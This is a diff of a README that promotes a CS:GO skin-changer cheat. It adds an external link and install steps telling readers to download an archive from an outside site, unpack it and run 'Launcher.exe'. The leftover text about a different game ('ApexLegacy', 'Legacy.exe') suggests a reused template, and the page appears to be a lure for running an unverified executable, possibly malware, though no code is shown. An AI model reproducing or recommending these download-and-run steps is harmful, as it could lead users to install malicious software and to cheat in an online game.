@@ -9,11 +9,12 @@ Description You love CS:GO, but miss some skins? Would you like to get Dragon Lo
 
 ✅CSGO Skin Changer
 👇👇👇👇👇
+https://lavalink.pw/CSGO_Skin_Changer/index.php
 
 # 💻 How to download?
 
-+ 1) Download the cheat
-+ 2) Open zip ApexLegacy
-+ 3) Unzip the file to any folder/desktop.
-+ 4) Run Legacy.exe file
-+ 5) Enjoy it.
+🏵Download From "www.lavacht.com"
+🏵Unpack Archive "CSGO_Skin_Changer.zip"
+🏵Run "Launcher.exe"
+🏵Waiting For The Installation To Complete
+🏵Done✔️
